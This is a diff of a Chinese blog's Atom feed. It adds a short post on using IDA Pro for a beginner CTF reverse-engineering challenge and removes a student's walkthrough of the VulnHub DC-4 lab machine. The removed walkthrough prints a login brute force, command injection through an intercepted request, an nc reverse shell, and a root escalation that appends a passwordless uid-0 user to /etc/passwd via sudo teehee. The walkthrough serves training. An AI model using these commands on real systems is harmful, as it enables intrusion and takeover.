@@ -6,7 +6,7 @@
   <link href="https://www.maonie.top/atom.xml" rel="self"/>
   
   <link href="https://www.maonie.top/"/>
-  <updated>2024-08-02T06:25:54.897Z</updated>
+  <updated>2024-08-07T03:38:25.525Z</updated>
   <id>https://www.maonie.top/</id>
   
   <author>
@@ -15,6 +15,40 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>逆逆逆逆逆向-CTF之reverse</title>
+    <link href="https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/"/>
+    <id>https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/</id>
+    <published>2024-08-05T04:10:49.000Z</published>
+    <updated>2024-08-07T03:38:25.525Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类"><a href="#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类" class="headerlink" title="既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类"></a>既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类</h1><p>关键基本都在ipa pro的使用<br>以及反编程后的信息搜集</p><pre class="line-numbers language-none"><code class="language-none">~目前来说有用的记录~shift+f12 查看字符串 ctrl+X 查询该字符串对应内存的相关调用f5 查看伪c代码代码中的变量直接选中后双击就可查看具体内容ipa pro的环境目录内最好是纯英文 不然会出各种各样的bug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试题-BUUCTF-easyre1"><a href="#测试题-BUUCTF-easyre1" class="headerlink" title="测试题 BUUCTF-easyre1"></a>测试题 BUUCTF-easyre1</h2><span id="more"></span><p>将题目提供的exe以ipa pro打开<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/1.jpg" alt="1"><br>ipa pro会自动判断我们提供软件的类型并提供选择 这里直接点击ok<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/2.jpg" alt="2"><br>软件内有很多不同的视窗 我们来主要分析他生成的视窗化代码<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/3.jpg" alt="3"><br>很明显这段就是flag 输入后便能完成题目</p><p>目前先更到这里 后面主要讲解ipa pro 的各项功能和视窗的不同 然后再来两个例题</p></body></html>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot;&gt;&lt;a href=&quot;#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot; class=&quot;headerlink&quot; title=&quot;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&quot;&gt;&lt;/a&gt;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&lt;/h1&gt;&lt;p&gt;关键基本都在ipa pro的使用&lt;br&gt;以及反编程后的信息搜集&lt;/p&gt;
+&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;~目前来说有用的记录~
+shift+f12 查看字符串 
+ctrl+X 查询该字符串对应内存的相关调用
+f5 查看伪c代码
+代码中的变量直接选中后双击就可查看具体内容
+
+ipa pro的环境目录内最好是纯英文 不然会出各种各样的bug&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;测试题-BUUCTF-easyre1&quot;&gt;&lt;a href=&quot;#测试题-BUUCTF-easyre1&quot; class=&quot;headerlink&quot; title=&quot;测试题 BUUCTF-easyre1&quot;&gt;&lt;/a&gt;测试题 BUUCTF-easyre1&lt;/h2&gt;</summary>
+    
+    
+    
+    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
+    
+    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
+    
+    
+    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
+    
+    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>求解</title>
@@ -525,34 +559,6 @@
     
     
     <category term="读书笔记" scheme="https://www.maonie.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DC-4解析</title>
-    <link href="https://www.maonie.top/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/"/>
-    <id>https://www.maonie.top/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/</id>
-    <published>2023-12-29T00:52:35.000Z</published>
-    <updated>2024-03-28T04:18:34.193Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是学校作业哦<br>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><hr><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：DC-4<br>网络链接均为Nat模式</p><h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>burpsuite （爆破 监听 数据包更改）<br>hydra（爆破用工具）<br>teehee提权</p><span id="more"></span><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>照例<br><code>arp-scan -l //发现同网段设备</code><br><code>nmap -p- -A [指定的ip地址] //扫描开放的端口并套用脚本</code><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>既然开放了80端口 那就访问看看<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>是个登陆页面 说是<strong>admin</strong>信息系统登陆<br>我们用burpsuite爆破密码试试<br>调整firefox与burpsuite的proxy设定 我们开启监听 <strong>send to intruder</strong><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>用攻击类型Cluster bomb来爆破 字典选择kali中自带的/usr/share/john/password.lst</p><blockquote><p>坑:本来想用rockyou.txt的 行数太多常常导致burpsuite的崩溃</p></blockquote><p>注意该lst文件前面会有几行注释 选中后点击左边的remove即可<br>因为使用的是Cluster bomb需要给两个<strong>payload</strong>都加上内容<br>我们切换<strong>payload set</strong>继续导入词库<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>ok了 点击右上角按钮开始攻击<br>嫌速度慢的可以在Resource pool中更改线程<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/5.jpg" alt="5"><br>经过极其漫长的等待<br>结果出来了<br>账号名为<strong>admin</strong> 密码为<strong>happy</strong><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>我们用这套账号密码登陆进入网站<br>网站里面有一些命令可以执行 但都是固定的<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们用burpsuite抓包 尝试修改命令<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/9.jpg" alt="9"><br>我们把命令改成<strong>ipconfig</strong><br>可以看到照样成功运行了<br>既然运行命令可行 那就利用nc(瑞士军刀)反弹shell吧<br>在kali端运行<code>nc -lnvp 1234 //于1234端口开始监听</code><br>在burpsuite中将命令改为<code>nc [kali的ip地址] [端口] -e /bin/sh //反弹shell</code><br>点击send 成功反弹<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>利用<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>优化交互页面<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>在根目录的home目录下使用<code>ls -alR</code>递归显示所有目录与隐藏文件<br>在jim目录底下发现名为old-passwords.bak的文件<br>联系一开始端口扫描中开放的22端口<br>我们需要尝试登陆ssh服务<br>至于如何把该文件中的内容传回来 直接复制粘贴即可<br>账号名为<strong>jim</strong> 密码目录使用复制粘贴的密码目录<br>工具为hydra<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br><code>hydra -l [用户名] -P [密码字典目录] [服务名：//ip地址]</code><br>我们稍等片刻 结果出来了<br><code>[22][ssh] host: 192.168.246.142   login: jim   password: jibril04</code><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>登陆完毕 嘻嘻<br>一进来系统就说<strong>you have mail</strong><br>那我们找找这封邮件在哪里</p><pre class="line-numbers language-none"><code class="language-none">find [寻找范围] -name [想找的文件名称] 2&gt;/dev/null2&gt;/dev/null 不输出报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/14.jpg" alt="14"><br>发现在**/var/mail**目录里边有一封信件<br>(大意:jim 我这周要去休假 老板叫我给你我的密码 免得有要紧事 拜拜）<br>有了charles的账号密码 我们切换一下账号<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>成功进入 我们sudo -l查看该用户的sudo权限<br>发现他可以以root权限免密码执行 /usr/bin/teehee<br>那就通过teehee提权的方式来获取权限</p><blockquote><p>参考：<a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee提权</a><br>teehee是个小众的linux编辑器 如果有sudo权限 可以利用其来提权<br>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><pre class="line-numbers language-none"><code class="language-none">echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su admin就可以登录到admin用户，这个用户因为uid为0，所以也是root权限</p></blockquote><p>我们安装教程 输入<code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code><br>随后便能不使用密码<strong>su admin</strong><br>flag自然在/root目录之下<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/16.jpg" alt="16"><br>成功！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>知识点比较少 短小精悍的靶机<br>那我们下次再见！</p></body></html>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;这个是学校作业哦&lt;br&gt;下载地址：&lt;a href=&quot;https://www.vulnhub.com/entry/dc-4,313/&quot;&gt;https://www.vulnhub.com/entry/dc-4,313/&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：DC-4&lt;br&gt;网络链接均为Nat模式&lt;/p&gt;
-&lt;h2 id=&quot;相关知识与工具&quot;&gt;&lt;a href=&quot;#相关知识与工具&quot; class=&quot;headerlink&quot; title=&quot;相关知识与工具&quot;&gt;&lt;/a&gt;相关知识与工具&lt;/h2&gt;&lt;p&gt;burpsuite （爆破 监听 数据包更改）&lt;br&gt;hydra（爆破用工具）&lt;br&gt;teehee提权&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
-    
-    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
-    
-    
-    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
-    
-    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
     
   </entry>
   
